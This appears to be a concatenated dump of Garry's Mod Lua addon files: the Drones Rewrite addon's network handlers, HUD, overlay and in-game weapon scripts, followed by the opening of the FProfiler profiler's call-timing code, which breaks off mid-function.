	util.AddNetworkString("dronesrewrite_makebind")
	util.AddNetworkString("dronesrewrite_requestweapons")
	util.AddNetworkString("dronesrewrite_addfriends")
	util.AddNetworkString("dronesrewrite_removeweapon")
	util.AddNetworkString("dronesrewrite_changewep")
	util.AddNetworkString("dronesrewrite_addmodule")
	util.AddNetworkString("dronesrewrite_clickkey")
end

if SERVER then
	net.Receive("dronesrewrite_addfriend", function(len, ply)
		if checkAccess( ply ) then return end
		local drone = net.ReadEntity()
		local guy = net.ReadEntity()

		if not IsValid(drone) then return end
		if not drone:CanBeControlledBy_skipai(ply) then ply:ChatPrint("[Drones] You're not owner of this drone!") return end

		if not drone.DRRFriendsControlling then drone.DRRFriendsControlling = { } end

		if not IsValid(guy) then ply:ChatPrint("[Drones] Invalid player!") return end

		if table.HasValue(drone.DRRFriendsControlling, guy:SteamID()) then
			table.RemoveByValue(drone.DRRFriendsControlling, guy:SteamID())
			ply:ChatPrint(guy:Name() .. " has been removed from friends!")

			local friends = { }
			for k, v in pairs(drone.DRRFriendsControlling) do
				local ply = player.GetBySteamID(v)
				if ply:IsValid() then table.insert(friends, ply:Name()) end
			end

			if next(friends) == nil then return end

			ply:ChatPrint("Current friends: " .. table.concat(friends, ", "))
		else
			table.insert(drone.DRRFriendsControlling, guy:SteamID())
			ply:ChatPrint(guy:Name() .. " has been added to friends!")
		end
	end)

	net.Receive("dronesrewrite_controldr", function(len, ply)
		if checkAccess( ply ) then return end
		local con = net.ReadEntity()
		local drone = con.Drone
		if IsValid(drone) then drone:SetDriver(ply, con.DistanceMaxDRR, con) end
	end)

	net.Receive("dronesrewrite_controllerlookup", function(len, ply)
		if checkAccess( ply ) then return end
		local con = net.ReadEntity()
		local unit = net.ReadString()

		if not IsValid(con) then return end

		local drone = DRONES_REWRITE.FindDroneByUnit(unit)
		if IsValid(drone) and not drone:CanBeControlledBy(ply) then return end

		con:SetDrone(drone)
	end)

	net.Receive("dronesrewrite_conexit", function(len, ply)
		if checkAccess( ply ) then return end
		local con = net.ReadEntity()

		if not IsValid(con) then return end

		if con:GetClass() != "dronesrewrite_console" then return end
		if ply != con.User then return end
		
		con:Exit()
	end)

	net.Receive("dronesrewrite_concmd", function(len, ply)
		if checkAccess( ply ) then return end
		local console = net.ReadEntity()
		local cmd = net.ReadString()
		local unk = net.ReadString()

		if not IsValid(console) then return end

		local _args = string.Explode(" ", unk)
		if console:GetClass() != "dronesrewrite_console" then return end
		if not IsValid(console.User) then return end
		if ply != console.User then return end

		if console.CatchCommand and not console.CatchCommand(console, _args, string.lower(cmd)) then
			return
		end

		if console.Commands[string.lower(cmd)] then 
			console.Commands[string.lower(cmd)](console, _args)
		else
			console:AddLine("Unknown command: " .. cmd)
		end
	end)

	net.Receive("dronesrewrite_makebind", function(len, ply)
		if checkAccess( ply ) then return end
		local drone = net.ReadEntity()
		local isLeftBtn = tobool(net.ReadBit())
		local wepName = net.ReadString()
		local key = net.ReadString()

		if not IsValid(drone) then return end
		if not drone:CanBeControlledBy(ply) then return end

		local wep = drone.ValidWeapons[wepName]

		if wep.Key then drone:FastRemoveBind(wep.Key, wepName .. "_binds") end
		if wep.Key2 then drone:FastRemoveBind(wep.Key2, wepName .. "_binds") end

		if not key then return end

		if IsValid(wep) then
			if isLeftBtn then 
				wep.Key = key 

				drone:AddKeyBind(key, wepName .. "_binds", function()
					drone:Attack1(wepName)
				end)

				drone:AddUnpressKeyBind(key, wepName .. "_binds", function()
					drone:OnAttackStopped(wepName)
				end)
			else
				wep.Key2 = key

				drone:AddKeyBind(key, wepName .. "_binds", function()
					drone:Attack2(wepName)
				end)

				drone:AddUnpressKeyBind(key, wepName .. "_binds", function()
					drone:OnAttackStopped2(wepName)
				end)
			end
		end
	end)

	net.Receive("dronesrewrite_requestweapons", function(len, ply)
		if checkAccess( ply ) then return end
		local drone = net.ReadEntity()
		local sendto = net.ReadString()
		local sel = tobool(net.ReadBit())

		local weps = { }
		for k, v in pairs(drone.ValidWeapons) do 
			if v.NoSelecting and not sel then continue end
			table.insert(weps, k)
		end

		net.Start(sendto)
			net.WriteEntity(drone)
			net.WriteTable(weps)
		net.Send(ply)
	end)

	net.Receive("dronesrewrite_addfriends", function(len, ply)
		if checkAccess( ply ) then return end
		ply.dronesrewrite_friends = net.ReadTable()
	end)

	net.Receive("dronesrewrite_removeweapon", function(len, ply)
		if checkAccess( ply ) then return end
		local drone = net.ReadEntity()
		local wep = net.ReadString()

		if not IsValid(ply) then return end
		if not ply:IsAdmin() then return end

		drone:RemoveWeapon(wep)
	end)

	net.Receive("dronesrewrite_changewep", function(len, ply)
		if checkAccess( ply ) then return end
		local wep = net.ReadString()
		local drone = ply:GetNWEntity("DronesRewriteDrone")
		if drone:IsValid() then drone:SelectNextWeapon(wep) end
	end)

	net.Receive("dronesrewrite_addmodule", function(len, ply)
		if checkAccess( ply ) then return end
		local drone = net.ReadEntity()
		local module = net.ReadString()
		local add = tobool(net.ReadBit())

		if not IsValid(drone) then return end
		if not drone:CanBeControlledBy_skipai(ply) then 
			net.Start("dronesrewrite_playsound")
				net.WriteString("buttons/button10.wav")
			net.Send(ply)
			
			return 
		end

		net.Start("dronesrewrite_playsound")
			net.WriteString("buttons/button24.wav")
		net.Send(ply)
		
		local mod = drone.Modules[module]
		if not mod then return end

		if add then
			if mod.System then drone:AddModule(module) end -- now you can't add new modules via gui
		else
			if drone:RemoveModule(module) then
				local nicename = "dronesrewrite_upgrcase_" .. string.lower(string.Replace(module, " ", "_"))

				local case = ents.Create(nicename)
				if not case then return end

				local tr = util.TraceLine({
					start = ply:GetShootPos(),
					endpos = ply:GetShootPos() + ply:GetAimVector() * 200,
					filter = ply
				})

				local ang = (case:GetPos() - ply:GetPos()):Angle()
				ang.p = 0
				ang.r = 0

				case:SetPos(tr.HitPos - tr.HitNormal * 32)
				case:SetAngles(ang)
				case:Spawn()

				ply:AddCleanup("entity", case)
				undo.Create(module)
					undo.AddEntity(case)
					undo.SetPlayer(ply)
				undo.Finish("Upgrade case " .. module)
				cleanup.Add(ply, "entity", case)
			end
		end
	end)

	net.Receive("dronesrewrite_clickkey", function(len, ply)
		if checkAccess( ply ) then return end
		local drone = net.ReadEntity()
		local key = net.ReadString()

		if not IsValid(drone) then return end
		if not drone:CanBeControlledBy_skipai(ply) then return end

		drone:ClickKey(key)
	end)

	net.Receive("dronesrewrite_presskey", function(len, ply)
		if checkAccess( ply ) then return end
		local drone = net.ReadEntity()
		local key = net.ReadInt(8)
		
		if not IsValid(drone) then return end
		if not drone:CanBeControlledBy_skipai(ply) then return end

		local bind = DRONES_REWRITE.KeyNames[key]

		for k, v in pairs(DRONES_REWRITE.Keys) do
			if ply:GetInfoNum("dronesrewrite_key_" .. k, 0) == key then
				bind = k
				break
			end
		end

		if not bind then return end

		drone:PressKey(bind)
	end)
else
	net.Receive("dronesrewrite_updcam", function()
		DRONES_REWRITE.UpdateCamera()
	end)

	net.Receive("dronesrewrite_playsound", function()
		local name = net.ReadString()
		surface.PlaySound(name)
	end)

	net.Receive("dronesrewrite_doprecache", function()
		DRONES_REWRITE.DoPrecache()
	end)

	net.Receive("dronesrewrite_closeconsole", function()
		local con = net.ReadEntity()

		if not IsValid(con) then return end
		con:CloseWindow()
	end)

	net.Receive("dronesrewrite_opencontroller", function()
		local con = net.ReadEntity()

		if not IsValid(con) then return end
		con:OpenMenu()
	end)

	net.Receive("dronesrewrite_clearconsole", function()
		local con = net.ReadEntity()

		if not IsValid(con) then return end
		con.Cache = { }
	end)

	net.Receive("dronesrewrite_openconsole", function()
		local con = net.ReadEntity()

		if not IsValid(con) then return end
		con:OpenConsole()
	end)

	net.Receive("dronesrewrite_addline", function()
		local con = net.ReadEntity()
		local line = net.ReadString()
		local color = net.ReadColor()

		if not IsValid(con) then return end
		if not con.AddLine then return end

		con:AddLine(line, color)
	end)

	net.Receive("dronesrewrite_removehook", function()
		local drone = net.ReadEntity()
		local class = net.ReadString()
		local name = net.ReadString()

		if not IsValid(drone) then return end
		drone:RemoveHook(class, name)
	end)

	net.Receive("dronesrewrite_addhook", function()
		local drone = net.ReadEntity()
		local class = net.ReadString()
		local name = net.ReadString()
		local func = net.ReadString()

		if not IsValid(drone) then return end
		if not drone.AddHook then return end

		drone:AddHook(class, name, func)
	end)

	net.Receive("dronesrewrite_openselectmenu", function()
		local drone = net.ReadEntity()
		local weps = net.ReadTable()

		if not IsValid(drone) then return end
		drone:OpenSelectionMenu(weps)
	end)

	net.Receive("dronesrewrite_openbindsmenu", function()
		local drone = net.ReadEntity()
		local weps = net.ReadTable()

		if not IsValid(drone) then return end
		drone:OpenBindsMenu(weps)
	end)

	net.Receive("dronesrewrite_openweaponscustom", function()
		local drone = net.ReadEntity()
		local weps = net.ReadTable()

		if not IsValid(drone) then return end
		drone:OpenWeaponsMenu(weps)
	end)

	net.Receive("dronesrewrite_sniperrifle", function()
		local drone = net.ReadEntity()
		local show = tobool(net.ReadBit())

		if show then
			if IsValid(drone) then drone.HUD_shouldDrawHud = false end

			hook.Add("AdjustMouseSensitivity", "dronesrewrite_sniper_mouse", function(old)
				return 0.16
			end)

			hook.Add("HUDPaint", "dronesrewrite_sniper_rifle", function()
				local x, y = ScrW() * 0.5, ScrH() * 0.5

				surface.SetMaterial(Material("particles/dronesrewrite_sniper"))
				surface.SetDrawColor(Color(0, 0, 0, 255))

				local size = ScrH() * 2
				surface.DrawLine(0, y, ScrW(), y)
				surface.DrawLine(x, 0, x, ScrH())
				surface.DrawTexturedRect(x - (size* 0.5), y - (size* 0.5), size, size)

				surface.SetDrawColor(Color(0, 0, 0, 64))
				surface.SetMaterial(Material("stuff/whiteboxhud/center"))
				surface.DrawTexturedRectRotated(x, y, size * 0.8, size * 0.8, CurTime() * 32)

				local text = "[" .. math.floor(drone:GetPos():Distance(drone:GetCameraTraceLine().HitPos)) ..  "]"
				draw.SimpleText(text, "DronesRewrite_font5", x - 128, y - 32, Color(0, 0, 0, 255), TEXT_ALIGNT_LEFT)

				local text = "[" .. drone:GetPrimaryAmmo() ..  "]"
				draw.SimpleText(text, "DronesRewrite_font5", x + 64, y - 32, Color(0, 0, 0, 255), TEXT_ALIGNT_RIGHT)
			end)
		else
			if IsValid(drone) then drone.HUD_shouldDrawHud = true end

			hook.Remove("AdjustMouseSensitivity", "dronesrewrite_sniper_mouse")
			hook.Remove("HUDPaint", "dronesrewrite_sniper_rifle")
		end
	end)

	net.Receive("dronesrewrite_sniperrifle_crosshair", function()
		local drone = net.ReadEntity()
		local show = tobool(net.ReadBit())

		if show then
			if IsValid(drone) then drone.HUD_shouldDrawCrosshair = true end
		else
			if IsValid(drone) then drone.HUD_shouldDrawCrosshair = false end
		end
	end)
end
--PATH addons/_drones/lua/dronesrewrite/client/hud/drones1.lua:
DRONES_REWRITE.HUD["Drones 1"] = function(drone)
	local shouldDrawCrosshair = drone.HUD_shouldDrawCrosshair
	local shouldDrawHealth = drone.HUD_shouldDrawHealth
	local shouldDrawFuel = drone.HUD_shouldDrawFuel
	local shouldDrawWeps = drone.HUD_shouldDrawWeps
	local shouldDrawCenter = drone.HUD_shouldDrawCenter

	local x, y = ScrW(), ScrH()
	local pos = (drone:GetForward() * 10 + drone:LocalToWorld(drone.FirstPersonCam_pos)):ToScreen()

	if shouldDrawCenter then
		surface.SetDrawColor(Color(255, 0, 0))

		surface.DrawLine(pos.x - 30, pos.y - 30, pos.x - 40, pos.y - 40)
		surface.DrawLine(pos.x - 30, pos.y + 30, pos.x - 40, pos.y + 40)
		surface.DrawLine(pos.x + 30, pos.y - 30, pos.x + 40, pos.y - 40)
		surface.DrawLine(pos.x + 30, pos.y + 30, pos.x + 40, pos.y + 40)

		for i = 1, x, 50 do surface.DrawLine(i, pos.y, i + 15, pos.y) end
		surface.DrawCircle(pos.x, pos.y, 50, Color(255, 0, 0))

		surface.DrawCircle(pos.x, pos.y, 200, Color(0, 255, 0))
		surface.DrawCircle(pos.x, pos.y, 210, Color(0, 255, 0))

		-- Misc
		draw.SimpleText(tostring(drone:GetPos()), "Trebuchet24", 50, y / 1.1, Color(255, 0, 0), TEXT_ALIGNT_LEFT)
		draw.SimpleText("SPEED " .. math.Round(drone:GetVelocity():Length()), "Trebuchet24", pos.x * 0.5, pos.y + 20, Color(255, 0, 0))
		draw.SimpleText(drone:GetUnit(), "Trebuchet24", pos.x * 0.5, pos.y + 40, Color(255, 0, 0))
	end

	if shouldDrawHealth then
		draw.SimpleText("ARMOR " .. drone:GetHealth(), "Trebuchet24", pos.x * 0.5, pos.y, Color(255, 0, 0))
	end

	if shouldDrawFuel then 
		draw.SimpleText("FUEL " .. drone:GetFuel(), "Trebuchet24", pos.x * 0.5, pos.y + 60, Color(255, 0, 0)) 
	end

	if shouldDrawWeps then
		draw.SimpleText("PRIMARY AMMO " .. drone:GetPrimaryAmmo() .. " / " .. drone:GetPrimaryMax(), "Trebuchet24", pos.x * 0.5, pos.y + 80, Color(255, 0, 0))
		draw.SimpleText("SECONDARY AMMO " .. drone:GetSecondaryAmmo() .. " / " .. drone:GetSecondaryMax(), "Trebuchet24", pos.x * 0.5, pos.y + 100, Color(255, 0, 0))
		draw.SimpleText("CURRENT WEAPON [" .. drone:GetNWString("CurrentWeapon"):upper() .. "]", "Trebuchet24", pos.x * 0.5, pos.y + 120, Color(255, 0, 0))
	end

	if shouldDrawCrosshair then
		--Crosshair

		x, y = x * 0.5, y * 0.5

		surface.SetDrawColor(Color(0, 255, 0))
		
		surface.DrawLine(x - 10, y - 10, x - 20, y - 20)
		surface.DrawLine(x - 10, y + 10, x - 20, y + 20)
		surface.DrawLine(x + 10, y - 10, x + 20, y - 20)
		surface.DrawLine(x + 10, y + 10, x + 20, y + 20)
	end
end
--PATH addons/_drones/lua/dronesrewrite/client/hud/mecha.lua:
DRONES_REWRITE.HUD["Mecha"] = function(drone)
	surface.SetDrawColor(Color(255, 255, 255, 200))
end
--PATH addons/_drones/lua/dronesrewrite/client/overlay/scifi.lua:
DRONES_REWRITE.Overlay["Sci Fi"] = function(drone)
	local eff_tab = {
		["$pp_colour_addr"] = 0,
		["$pp_colour_addg"] = 0.1,
		["$pp_colour_addb"] = 0.1,
		["$pp_colour_brightness"] = -0.25,
		["$pp_colour_contrast"] = 1.2,
		["$pp_colour_colour"] = 0.25,
		["$pp_colour_mulr"] = 0,
		["$pp_colour_mulg"] = 0,
		["$pp_colour_mulb"] = 0
	}

	DrawColorModify(eff_tab)
	DrawBloom(0.5, 1, 1, 1, 1, 1, 1, 1, 1)
	DrawSharpen(2, 0.5)
end
--PATH addons/_drones/lua/dronesrewrite/weapons/blaster5.lua:
DRONES_REWRITE.Weapons["Yellow Blaster"] = {
	Initialize = function(self, pos, ang)
		local ent = DRONES_REWRITE.Weapons["Template"].Initialize(self, "models/dronesrewrite/blaster/blaster.mdl", pos, ang, "models/dronesrewrite/attachment4/attachment4.mdl", pos)

		ent.PrimaryAmmo = 800
		ent.PrimaryAmmoMax = 800
		ent.PrimaryAmmoType = { DRONES_REWRITE.AmmoTypes.Plasma }

		ent.WaitTime = 0

		return ent
	end,

	Think = function(self, gun)
		DRONES_REWRITE.Weapons["Template"].Think(self, gun)

		if gun.PlaySound and CurTime() > gun.NextShoot2 then
			gun:EmitSound("vehicles/tank_readyfire1.wav", 78, 255, 1, CHAN_WEAPON)
			gun.PlaySound = false
		end
	end,

	Attack = function(self, gun)
		if not self:IsKeyDown("Fire2") and  CurTime() > gun.NextShoot and gun:HasPrimaryAmmo() then
			local src = gun:GetPos() + gun:GetForward() * 64 + gun:GetUp()

			local ammo = ents.Create("dronesrewrite_ye_laser")
			ammo:SetPos(src)
			ammo:SetAngles(gun:GetAngles() + AngleRand() * 0.004)
			ammo:Spawn()
			ammo.Owner = self:GetDriver()
			
			constraint.NoCollide(ammo, self, 0, 0)

			ammo:EmitSound("drones/alien_fire.wav", 85, 100, 1, CHAN_WEAPON)

			local ef = EffectData()
			ef:SetOrigin(src - gun:GetForward() * 20)
			ef:SetNormal(gun:GetForward())
			util.Effect("dronesrewrite_muzzleflashblaster5", ef)
	
			gun:SetPrimaryAmmo(-1)
			gun.NextShoot = CurTime() + 0.1
		end
	end,

	Attack2 = function(self, gun)
		if not self:IsKeyDown("Fire1") and CurTime() > gun.NextShoot2 and gun:HasPrimaryAmmo() then
			local src = gun:GetPos() + gun:GetForward() * 64 - gun:GetUp() * 2.5

			local ammo = ents.Create("dronesrewrite_ye_laser_sm")
			ammo:SetPos(src)
			ammo:SetAngles(gun:GetAngles() + AngleRand() * 0.02)
			ammo:Spawn()
			ammo.Owner = self:GetDriver()
			
			constraint.NoCollide(ammo, self, 0, 0)

			ammo:EmitSound("drones/alien_fire.wav", 85, math.random(90, 120), 1, CHAN_WEAPON)

			local ef = EffectData()
			ef:SetOrigin(src - gun:GetForward() * 21)
			ef:SetNormal(gun:GetForward())
			util.Effect("dronesrewrite_muzzleflashblaster5", ef)	

			gun:SetPrimaryAmmo(-1)
			gun.NextShoot2 = CurTime() + 0.02

			gun.WaitTime = math.Approach(gun.WaitTime, 1, 0.01)
			if gun.WaitTime >= 1 then 
				gun.PlaySound = true
				gun.NextShoot2 = CurTime() + 3.6
				gun.WaitTime = 0
			end
		end
	end
}
--PATH addons/_drones/lua/dronesrewrite/weapons/empty.lua:
DRONES_REWRITE.Weapons["Empty"] = {
	Initialize = function(self, pos, ang)
		return DRONES_REWRITE.Weapons["Template"].InitializeNoDraw(self)
	end
}
--PATH addons/_drones/lua/dronesrewrite/weapons/minigun.lua:
DRONES_REWRITE.Weapons["Heavy Minigun"] = {
	Initialize = function(self, pos, ang)
		local ent = DRONES_REWRITE.Weapons["Template"].Initialize(self, "models/dronesrewrite/minigun/minigun.mdl", pos, ang, "models/dronesrewrite/attachment4/attachment4.mdl", pos)

		DRONES_REWRITE.Weapons["Template"].SpawnSource(ent, Vector(55, 0, 3))

		ent.Rotate = 0
		ent.Angle = 0

		ent.PrimaryAmmo = 3000
		ent.PrimaryAmmoMax = 3000
		ent.PrimaryAmmoType = { DRONES_REWRITE.AmmoTypes.Pistol }

		return ent
	end,

	Think = function(self, gun)
		DRONES_REWRITE.Weapons["Template"].Think(self, gun)

		if gun.StopRotating then
			gun.Rotate = math.Approach(gun.Rotate, 0, 0.025)
		end

		gun.Angle = gun.Angle + (gun.Rotate * 20)
		gun:ManipulateBoneAngles(gun:LookupBone("barr"), Angle(0, gun.Angle, 0))
	end,

	Attack = function(self, gun)
		if CurTime() > gun.NextShoot then
			if gun.Rotate >= 1 and gun:HasPrimaryAmmo() then
				local tr = self:GetCameraTraceLine()

				local damage = 8
				local force = 10

				local bullet = {}
				bullet.Num = 1
				bullet.Src = gun.Source:GetPos()
				bullet.Dir = gun:GetLocalCamDir()
				bullet.Spread = Vector(0.02, 0.01, 0.01)
				bullet.Tracer = math.random(2, 15)
				bullet.Force = force
				bullet.Damage = damage
				bullet.Attacker = self:GetDriver()
				
				gun.Source:FireBullets(bullet)
				gun:EmitSound("weapons/ar2/fire1.wav", 85, math.random(80, 100), 1, CHAN_WEAPON)

				self:SwitchLoopSound("Minigun", true, "drones/minigunshoot.wav", 100, 10)

				local phys = self:GetPhysicsObject()
				phys:ApplyForceCenter((gun:GetPos() - tr.HitPos):GetNormal() * 400000 / self.Weight)
				phys:AddAngleVelocity(VectorRand() * 600 / self.Weight)

				local ef = EffectData()
				ef:SetOrigin(gun.Source:GetPos())
				ef:SetNormal(gun:GetForward())
				util.Effect("dronesrewrite_muzzleflash", ef)

				gun:SetPrimaryAmmo(-1)
			else
				self:SwitchLoopSound("Minigun", false)
			end

			self:SetFuel(self:GetFuel() - 0.01)
			self:SwitchLoopSound("MinigunSpin", true, "vehicles/crane/crane_idle_loop3.wav", 100, 1, 90)

			gun.StopRotating = false
			gun.Rotate = math.Approach(gun.Rotate, 1, 0.025)
			gun.NextShoot = CurTime() + 0.02
		end
	end,

	OnAttackStopped = function(self, gun)
		gun.StopRotating = true
		gun:EmitSound("vehicles/apc/apc_shutdown.wav")

		self:SwitchLoopSound("Minigun", false)
		self:SwitchLoopSound("MinigunSpin", false)
	end,

	Holster = function(self, gun)
		gun.StopRotating = true
		gun:EmitSound("vehicles/apc/apc_shutdown.wav")

		self:SwitchLoopSound("Minigun", false)
		self:SwitchLoopSound("MinigunSpin", false)
	end,

	OnRemove = function(self, gun)
		self:SwitchLoopSound("Minigun", false)
		self:SwitchLoopSound("MinigunSpin", false)
	end
}
--PATH addons/_drones/lua/dronesrewrite/weapons/refuel.lua:
DRONES_REWRITE.Weapons["Refuel"] = {
	Initialize = function(self, pos, ang)
		local ent = DRONES_REWRITE.Weapons["Template"].InitializeNoHandler(self, "models/dronesrewrite/fueler/fueler.mdl", pos, ang)
		ent.ent = NULL
		ent.cnstr = NULL
		return ent	
	end,

	Attack = function(self, gun)
		if CurTime() > gun.NextShoot then
			if not gun.ent:IsValid() then
				local tr = util.TraceHull({
					start = gun:GetPos(),
					endpos = gun:GetPos() + Vector(0, 0, -450),
					filter = self,
					mins = Vector(-20, -20, 0),
					maxs = Vector(20, 20, 0)
				})

				local ent = tr.Entity
				if ent:IsValid() and ent.IS_DRR and ent:GetFuel() < ent.MaxFuel then
					local rope = 0
					gun.cnstr, rope = constraint.Rope(
						self, 
						ent, 
						0, 
						0, 
						self:WorldToLocal(gun:GetPos()-Vector(0,0,7)), 
						Vector(0, 0, 0), 
						(gun:GetPos()-Vector(0,0,7) - ent:GetPos()):Length() + 150,
						6, 
						0, 
						6, 
						"cable/cable2", 
						false)
					
					gun.ent = ent

					local driver = self:GetDriver()
					if driver:IsValid() then
						driver:ChatPrint("[Drones] Refueling " .. ent:GetUnit())
					end

					self:SwitchLoopSound("Refueling", true, "ambient/water/leak_1.wav", 100, 1)
				end
			else
				gun:EmitSound("garrysmod/balloon_pop_cute.wav")
				self:SwitchLoopSound("Refueling", false)
				gun.cnstr:Remove()
				gun.ent = NULL
			end

			gun.NextShoot = CurTime() + 0.5
		end
	end,

	Think = function(self, gun)
		if gun.ent:IsValid() then
			if math.Round(self:GetFuel()) <= 0 
				or math.Round(gun.ent:GetFuel()) >= gun.ent.MaxFuel
				or gun.ent:GetPos():Distance(gun:GetPos()) > 150 then

				gun:EmitSound("garrysmod/balloon_pop_cute.wav")
				self:SwitchLoopSound("Refueling", false)
				constraint.RemoveConstraints(self, "Rope")
				gun.ent = NULL

				return
			end

			self:SetFuel(self:GetFuel() - 0.02)
			gun.ent:SetFuel(gun.ent:GetFuel() + 0.02)
		end
	end
}
--PATH addons/_fpr/lua/autorun/fprofiler.lua:
FProfiler = {}
FProfiler.Internal = {}
FProfiler.UI = {}

AddCSLuaFile()
AddCSLuaFile("fprofiler/cami.lua")
AddCSLuaFile("fprofiler/gather.lua")
AddCSLuaFile("fprofiler/report.lua")
AddCSLuaFile("fprofiler/util.lua")
AddCSLuaFile("fprofiler/prettyprint.lua")

AddCSLuaFile("fprofiler/ui/model.lua")
AddCSLuaFile("fprofiler/ui/frame.lua")
AddCSLuaFile("fprofiler/ui/clientcontrol.lua")
AddCSLuaFile("fprofiler/ui/servercontrol.lua")

include("fprofiler/cami.lua")

CAMI.RegisterPrivilege{
    Name = "FProfiler",
    MinAccess = "superadmin"
}


include("fprofiler/prettyprint.lua")
include("fprofiler/util.lua")
include("fprofiler/gather.lua")
include("fprofiler/report.lua")


if CLIENT then
    include("fprofiler/ui/model.lua")
    include("fprofiler/ui/frame.lua")
    include("fprofiler/ui/clientcontrol.lua")
    include("fprofiler/ui/servercontrol.lua")
else
    include("fprofiler/ui/server.lua")
end

--PATH addons/_fpr/lua/fprofiler/gather.lua:
local timeMeasurementFunc = SysTime

-- Helper function, created by some ancient Lua dev
-- Retrieves the local variables and their values of a function
local function getupvalues(f)
    local t, i, k, v = {}, 1, debug.getupvalue(f, 1)
    while k do
        t[k] = v
        i = i + 1
        k,v = debug.getupvalue(f, i)
    end
    return t
end

-- Helper function
-- Get all local variables
local NIL = {}
setmetatable(NIL, {__tostring = function() return "nil" end})
local function getlocals(level)
    local i = 1
    local name, value
    local vars = {}

    while true do
        name, value = debug.getlocal(level, i)

        if not name then break end

        value = value == nil and NIL or value
        vars[name] = value
        i = i + 1
    end

    return vars
end

--[[-------------------------------------------------------------------------
Call counts:

registers how often function have been called
---------------------------------------------------------------------------]]
local callcounts = {}


-- Gets the call counts
FProfiler.Internal.getCallCounts = function() return callcounts end


-- Resets the call counts
function FProfiler.Internal.resetCallCounts()
    callcounts = {}
end

--[[-------------------------------------------------------------------------
Inclusive function times

Keeps track of how long functions take in total
i.e. average time between the start and return of a function * times called

This includes the time that any function called by this function takes
(that's what the "inclusive" refers to).
Note: recursive calls are not counted double
---------------------------------------------------------------------------]]

local inclusiveTimes = {}

-- Gets the inclusive times
FProfiler.Internal.getInclusiveTimes = function() return inclusiveTimes end

-- Resets the inclusive times
function FProfiler.Internal.resetInclusiveTimes()
    inclusiveTimes = {}
end

--[[-------------------------------------------------------------------------
Top n most expensive single function calls
Keeps track of the functions that took the longest time to run
Note: functions can appear in this list at most once
---------------------------------------------------------------------------]]
local mostExpensiveSingleCalls = {}

-- Gets most expensive single calls
FProfiler.Internal.getMostExpensiveSingleCalls = function() return mostExpensiveSingleCalls end

-- Dictionary to make sure the same function doesn't appear multiple times
-- in the top n
local mostExpensiveSingleDict = {}

function FProfiler.Internal.resetMostExpensiveSingleCalls()
    for i = 1, 50 do mostExpensiveSingleCalls[i] = {runtime = 0} end
    mostExpensiveSingleDict = {}
end

-- Initial empty list
FProfiler.Internal.resetMostExpensiveSingleCalls()

--[[-------------------------------------------------------------------------
Function information
Using debug.getinfo on a function object won't give you any function names
that's because functions can have multiple names.
Luckily, when the functions are called, debug.getinfo(level) gives the
function name and scope
---------------------------------------------------------------------------]]
local functionNames = {}

FProfiler.Internal.getFunctionNames = function() return functionNames end

--[[-------------------------------------------------------------------------
Recursion depth

Used internally to make sure recursive functions' times aren't counted
multiple times
---------------------------------------------------------------------------]]
local recursiveCount = {}

--[[-------------------------------------------------------------------------
Function start times

Used internally to keep track of when functions were called
---------------------------------------------------------------------------]]
local startTimes = {}

--[[-------------------------------------------------------------------------
Lua code event handlers
---------------------------------------------------------------------------]]

-- The recursion depth of the function that is in focus.
-- Only applies when profiling a specific function (i.e. laying focus upon)
local focusDepth = 0

-- Called when a function in the code is called
local function registerFunctionCall(funcInfo)
    local func = funcInfo.func

    -- Update call counts
    callcounts[func] = (callcounts[func] or 0) + 1

    -- Increase recursion depth for this function
    recursiveCount[func] = (recursiveCount[func] or 0) + 1

    -- Store function info
    local funcname = funcInfo.name or ""
    functionNames[func] = functionNames[func] or {}
    functionNames[func][funcname] = functionNames[func][funcname] or
        { namewhat = funcInfo.namewhat,
          nparams = funcInfo.nparams
        }

    local time = timeMeasurementFunc()

    -- Update inclusive function times,
    -- only when we're on the first recursive call
    if recursiveCount[func] == 1 then
        startTimes[func] = time
    end
end


-- Called when a function returns
local function registerReturn(funcInfo)
    local time = timeMeasurementFunc()
    local func = funcInfo.func
    local runtime = time - startTimes[func]

    -- Update inclusive function time
    -- Only update on the topmost call, to prevent recursive
    -- calls for being counted multiple times.
    if recursiveCount[func] == 1 then
        inclusiveTimes[func] = (inclusiveTimes[func] or 0) + runtime
    end

    -- Maintain recursion depth
    recursiveCount[func] = recursiveCount[func] - 1

    -- Update top n list
    -- This path will be taken most often: the function isn't special
    -- Also only counts the top recursion
    if runtime <= mostExpensiveSingleCalls[50].runtime or recursiveCount[func] > 1 then return end

    -- If the function already appears in the top 10, replace it or discard the result
    if mostExpensiveSingleDict[func] then
        local i = mostExpensiveSingleDict[func]

        -- Discard this info
        if runtime < mostExpensiveSingleCalls[i].runtime then return end

        -- Update the entry
        mostExpensiveSingleCalls[i].runtime = runtime
        mostExpensiveSingleCalls[i].upvalues = getupvalues(func)
        mostExpensiveSingleCalls[i].locals = getlocals(5)
        mostExpensiveSingleCalls[i].info = funcInfo
        mostExpensiveSingleCalls[i].func = func

        -- Move the updated entry up the top 10 list if applicable
        while i > 1 and runtime > mostExpensiveSingleCalls[i - 1].runtime do
            mostExpensiveSingleDict[mostExpensiveSingleCalls[i - 1].func] = i
            mostExpensiveSingleCalls[i - 1], mostExpensiveSingleCalls[i] = mostExpensiveSingleCalls[i], mostExpensiveSingleCalls[i - 1]
            i = i - 1
        end

        mostExpensiveSingleDict[func] = i

        return
    end

    -- Knowing that the function belongs in the top n, find its position
    local i = 50
    while i >= 1 and runtime > mostExpensiveSingleCalls[i].runtime do
        -- Update the dictionary
        -- All functions faster than the current one move down the list
        if not mostExpensiveSingleCalls[i].func then i = i - 1 continue end
        mostExpensiveSingleDict[mostExpensiveSingleCalls[i].func] = i + 1

        i = i - 1
    end

    -- Insert the expensive call in the top n
    mostExpensiveSingleDict[func] = i + 1
    table.insert(mostExpensiveSingleCalls, i + 1,
        {
            func = func,
            runtime = runtime,
            info = funcInfo,
            upvalues = getupvalues(func),
            locals = getlocals(5)
        })


    -- What was previously the 50th most expensive function
    -- is now kicked out of the top 10
    if mostExpensiveSingleCalls[51].func then
        mostExpensiveSingleDict[mostExpensiveSingleCalls[51].func] = nil
    end
    mostExpensiveSingleCalls[51] = nil
end


-- Called on any Lua event
local function onLuaEvent(event, focus)
    local info = debug.getinfo(3)
    local func = info.func

    if event == "call" or event == "tail call" then
        -- Only track the focussed function and the functions
        -- called by the focussed function
        if focus == func then focusDepth = focusDepth + 1 end
        if focus and focusDepth == 0 then return end

        registerFunctionCall(info)
    else
        -- Functions that return right after the call to FProfiler.Internal.start()
        -- are not to be counted
        if not recursiveCount[func] or recursiveCount[func] == 0 then return end

        if focus == func then focusDepth = focusDepth - 1 end
        if focus and focusDepth == 0 then return end

        registerReturn(info)
    end
